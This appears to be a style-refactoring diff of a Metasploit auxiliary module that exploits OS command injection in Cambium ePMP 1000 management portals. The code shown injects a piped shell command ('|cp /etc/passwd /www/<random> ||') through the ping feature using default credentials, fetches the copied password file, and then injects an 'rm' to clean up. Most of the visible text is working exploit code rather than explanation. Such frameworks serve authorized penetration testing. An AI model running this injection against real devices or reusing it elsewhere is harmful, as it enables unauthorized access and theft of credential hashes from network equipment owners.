@@ -7,25 +7,25 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::EPMP
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => "Cambium ePMP 1000 'ping' Password Hash Extractor (up to v2.5)",
-      'Description' => %{
+    super(
+      update_info(
+        info,
+        'Name' => "Cambium ePMP 1000 'ping' Password Hash Extractor (up to v2.5)",
+        'Description' => %q{
           This module exploits an OS Command Injection vulnerability in Cambium
           ePMP 1000 (<v2.5) device management portal. It requires any one of the
           following login credentials - admin/admin, installer/installer, home/home - to
           dump system hashes.
-      },
-      'References' =>
-        [
+        },
+        'References' => [
           ['URL', 'http://ipositivesecurity.com/2015/11/28/cambium-epmp-1000-multiple-vulnerabilities/'],
           ['URL', 'https://support.cambiumnetworks.com/file/476262a0256fdd8be0e595e51f5112e0f9700f83']
         ],
-      'Author' =>
-        [
+        'Author' => [
           'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
         ],
-      'License' => MSF_LICENSE
-     )
+        'License' => MSF_LICENSE
+      )
     )
 
     register_options(
@@ -39,7 +39,7 @@ class MetasploitModule < Msf::Auxiliary
     deregister_options('DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASS_FILE', 'BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'STOP_ON_SUCCESS')
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     unless is_app_epmp1000?
       return
     end
@@ -47,9 +47,9 @@ class MetasploitModule < Msf::Auxiliary
 
   # Command Execution
   def hash_dump(config_uri, cookie)
-    random_filename = Rex::Text::rand_text_alpha(8)
+    random_filename = Rex::Text.rand_text_alpha(8)
     command = 'cp /etc/passwd /www/' + random_filename
-    inject = '|' + "#{command}" + ' ||'
+    inject = '|' + command.to_s + ' ||'
     clean_inject = CGI.unescapeHTML(inject.to_s)
 
     res = send_request_cgi(
@@ -112,7 +112,7 @@ class MetasploitModule < Msf::Auxiliary
 
         # clean up the passwd file from /www/
         command = 'rm /www/' + random_filename
-        inject = '|' + "#{command}" + ' ||'
+        inject = '|' + command.to_s + ' ||'
         clean_inject = CGI.unescapeHTML(inject.to_s)
 
         res = send_request_cgi(
@@ -139,7 +139,7 @@ class MetasploitModule < Msf::Auxiliary
           }
         )
       else
-        check_file_uri = "#{(ssl ? 'https' : 'http')}" + '://' + "#{rhost}:#{rport}" + '/' + random_filename
+        check_file_uri = (ssl ? 'https' : 'http').to_s + '://' + "#{rhost}:#{rport}" + '/' + random_filename
         print_error("#{rhost}:#{rport} - Could not retrieve hashes. Try manually by directly accessing #{check_file_uri}.")
       end
     else
